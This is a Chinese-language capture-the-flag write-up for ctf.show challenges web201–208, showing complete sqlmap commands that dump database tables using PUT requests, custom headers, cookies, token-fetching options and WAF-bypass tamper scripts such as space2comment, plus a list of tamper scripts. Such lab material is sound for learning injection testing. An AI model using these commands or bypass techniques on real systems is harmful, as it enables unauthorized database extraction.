<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">爆字段</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://f6405b3c-b606-47bd-b2b1-443c31e912c6.challenge.ctf.show/api/?id=12 --user-agent sqlmap --referer http://f6405b3c-b606-47bd-b2b1-443c31e912c6.challenge.ctf.show/sqlmap.php -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web202">web202<a href="#web202" class="hash-link" aria-label="Direct link to web202" title="Direct link to web202">​</a></h3>
<p>题目描述：使用--data 调整sqlmap的请求方式</p>
<p>data不应该是POST用的吗，这里不是GET么用上面的payload没问题啊，为啥要调整</p>
<p><img decoding="async" loading="lazy" alt="image-20220110131535067" src="/assets/images/image-20220110131535067-14f2f313d5c6336281dd0302d531cf2e.png" width="1916" height="609" class="img_ev3q"></p>
<p>但GET确实注不出来。。改--data=就可以</p>
<p>直接给最后的payload</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">爆字段</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://e4fac56f-d2b4-460b-b90b-4c3f185db0c0.challenge.ctf.show/api/ --data=&quot;id=1&quot; --user-agent sqlmap --referer http://e4fac56f-d2b4-460b-b90b-4c3f185db0c0.challenge.ctf.show/sqlmap.php -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web203">web203<a href="#web203" class="hash-link" aria-label="Direct link to web203" title="Direct link to web203">​</a></h3>
<p>使用--method 调整sqlmap的请求方式</p>
<p>看一下使用方法：sqlmap -hh |grep &quot;method&quot;</p>
<p><img decoding="async" loading="lazy" alt="image-20220110132148094" src="/assets/images/image-20220110132148094-f053f48df127b98bb1242a07b8d43055.png" width="633" height="66" class="img_ev3q"></p>
<p>诶，那为啥要用Put呢</p>
<div class="language-what codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-what codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">url 一般选择包括参数输入的链接。如果是get方法，就直接跟在url后面用?补充参数。如果是post方法，用--data=’xxx=xxx&amp;yyy=yyy’格式发送。或者是--data=’{“xx”:”xxx”}’ json格式的数据。如果不是这两种常见方法，需要加参数 --method=put 或 --method=delete加以特别说明。如果是路径参数，就在参数位置写* ；如果需要加入header信息，需要加上参数--headers=’xx:xxx\nyy:yyy’ ，\n是多行，表示多个header项。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">————————————————</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">版 权声明：本文为CSDN博主「鹿鸣天涯」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">原文链接：https://blog.csdn.net/jayjaydream/article/details/108555660</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>看完了我也不清楚，嗯。总之这里使用PUT请求，还要设置Content-Type头，否则提交会变成表单提交</p>
<div class="language-This language-this codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-this codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">--headers=&quot;Content-Type: text/plain&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>而且这里不能/api/ 必须要写/api/index.php</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://ffa2a543-adbc-49fa-8edc-ee90f58860df.challenge.ctf.show/api/index.php --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --user-agent sqlmap --referer http://ffa2a543-adbc-49fa-8edc-ee90f58860df.challenge.ctf.show/sqlmap.php -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web204">web204<a href="#web204" class="hash-link" aria-label="Direct link to web204" title="Direct link to web204">​</a></h3>
<p>使用--cookie 提交cookie数据</p>
<p>火狐看了一眼cookie</p>
<table><thead><tr><th>Cookie</th><th>UM_distinctid=17de6c9e789a39-0088a827fd34f08-4c3e207f-144000-17de6c9e78a631; PHPSESSID=df3sj4eht92seoarkj6nr9t6gr;  ctfshow=c83835c8065c104bba7ca3dc385e55bd</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table>
<p>在之前的基础上加一句 就好</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://dfb9f16f-c648-42e7-b3e0-240c5aa1679e.challenge.ctf.show/api/index.php --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;UM_distinctid=17de6c9e789a39-0088a827fd34f08-4c3e207f-144000-17de6c9e78a631;PHPSESSID=df3sj4eht92seoarkj6nr9t6gr; ctfshow=c83835c8065c104bba7ca3dc385e55bd&quot; --user-agent sqlmap --referer http://dfb9f16f-c648-42e7-b3e0-240c5aa1679e.challenge.ctf.show/sqlmap.php -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>额，确实有点长，好像挺多都能省下来的</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web205">web205<a href="#web205" class="hash-link" aria-label="Direct link to web205" title="Direct link to web205">​</a></h3>
<p>api调用需要鉴权</p>
<p>查看network 发现一次性发了两个包，比之前多了一个/getToken.php</p>
<p>也就是说在请求去查表的时候是会先请求一个/getToken.php</p>
<p>意思是，在查表之前，要访问getToken.php，然后getToekn.php 是要给查表的时候用的。</p>
<p>使用sqlmap -hh，去百度翻译看看有没有我们需要的</p>
<p><img decoding="async" loading="lazy" alt="image-20220110133859281" src="/assets/images/image-20220110133859281-ed9dbff79fbd0c89fc9559b31a2b733c.png" width="1328" height="196" class="img_ev3q"></p>
<p>--safe-url就能够在我们去查之前，访问一下getToken</p>
<p>其次为了设置访问次数，还需要用到--safe-freq</p>
<p>于是有了如下payload(这里换了表名和列名，我就不放中间查询的payload的)</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://55bec546-a2a9-4ccc-9347-df357c6b8fa8.challenge.ctf.show/api/index.php --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://55bec546-a2a9-4ccc-9347-df357c6b8fa8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --user-agent sqlmap --referer http://55bec546-a2a9-4ccc-9347-df357c6b8fa8.challenge.ctf.show/sqlmap.php -D ctfshow_web -T ctfshow_flax -C flagx --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web206">web206<a href="#web206" class="hash-link" aria-label="Direct link to web206" title="Direct link to web206">​</a></h3>
<p>sql需要闭合</p>
<p>啥意思，不是能直接注出来么，然后发现还是有getToken，就改一下上面那道题的url</p>
<p>然后一步步注入发现又改了表和列名，嗐</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://4c678e53-94cf-464a-99ce-f4fac82f2817.challenge.ctf.show/api/index.php --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4c678e53-94cf-464a-99ce-f4fac82f2817.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --user-agent sqlmap --referer http://4c678e53-94cf-464a-99ce-f4fac82f2817.challenge.ctf.show/sqlmap.php -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web207">web207<a href="#web207" class="hash-link" aria-label="Direct link to web207" title="Direct link to web207">​</a></h3>
<p>--tamper 的初体验</p>
<p>查一下tamper，哦~，就是绕waf的脚本，毕竟有一个很熟悉的词tampermonkey，咱油猴用的脚本管理器</p>
<p>初体验是啥意思</p>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//对传入的参数进行了过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   return preg_match(&#x27;/ /&#x27;, $str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>意思是需要把一个绕waf的脚本，里面的空格，改成绕空格的，比如%09?</p>
<p>首先sqlmap自带的tamper脚本文件都在sqlmap的tamper文件夹下，部分如下文所示。</p>
<p>诶 发现这个space2comment.py好像可以用哦</p>
<div class="language-name codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-name codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">apostrophemask.py 用utf8代替引号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">equaltolike.py MSSQL * SQLite中like 代替等号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">space2hash.py 空格替换为#号 随机字符串 以及换行符</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">space2comment.py 用/**/代替空格</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">space2morehash.py MySQL中空格替换为 #号 以及更多随机字符串 换行符</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">space2mssqlblank.py mssql空格替换为其它空符号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">base64encode.py 用base64编码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">space2mssqlhash.py mssql查询中替换空格</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">space2mysqlblank.py mysql中空格替换其它空白符号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">multiplespaces.py 围绕SQL关键字添加多个空格</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">space2plus.py 用+替换空格</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chardoubleencode.py 双url编码(不处理以编码的)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unionalltounion.py 替换UNION ALL SELECT UNION SELECT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">charencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unmagicquotes.py 宽字符绕过 GPC addslashes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">randomcomments.py 用/**/分割sql关键字</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">securesphere.py 追加特制的字符串</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">versionedmorekeywords.py MySQL &gt;= 5.1.13注释绕过</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">halfversionedmorekeywords.py MySQL &lt; 5.1中关键字前加注释</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>顺便发现这里又改了表和列名ctfshow_flaxca   flagvc</p>
<p>于是payload</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://36df1ef4-f736-43c6-b212-24cc8b77203f.challenge.ctf.show/api/index.php --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://36df1ef4-f736-43c6-b212-24cc8b77203f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --user-agent sqlmap --referer http://36df1ef4-f736-43c6-b212-24cc8b77203f.challenge.ctf.show/sqlmap.php --tamper=space2comment.py -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web208">web208<a href="#web208" class="hash-link" aria-label="Direct link to web208" title="Direct link to web208">​</a></h3>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//对传入的参数进行了过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// $id = str_replace(&#x27;select&#x27;, &#x27;&#x27;, $id);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   return preg_match(&#x27;/ /&#x27;, $str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>select替换成空，还要绕过空格</p>
<p>空格还是想着用上面那个脚本，select替换空的话双写绕过或者大小写绕过吧</p>
<p>然后发现sqlmap跑的时候一直用的大写的select。。。</p>
<p>所以还是上一道题的脚本，只不过又改了列和表名</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://09b88295-4801-41f6-8e05-6c17422d302a.challenge.ctf.show/api/index.php --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://09b88295-4801-41f6-8e05-6c17422d302a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --user-agent sqlmap --referer http://09b88295-4801-41f6-8e05-6c17422d302a.challenge.ctf.show/sqlmap.php --tamper=space2comment.py -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 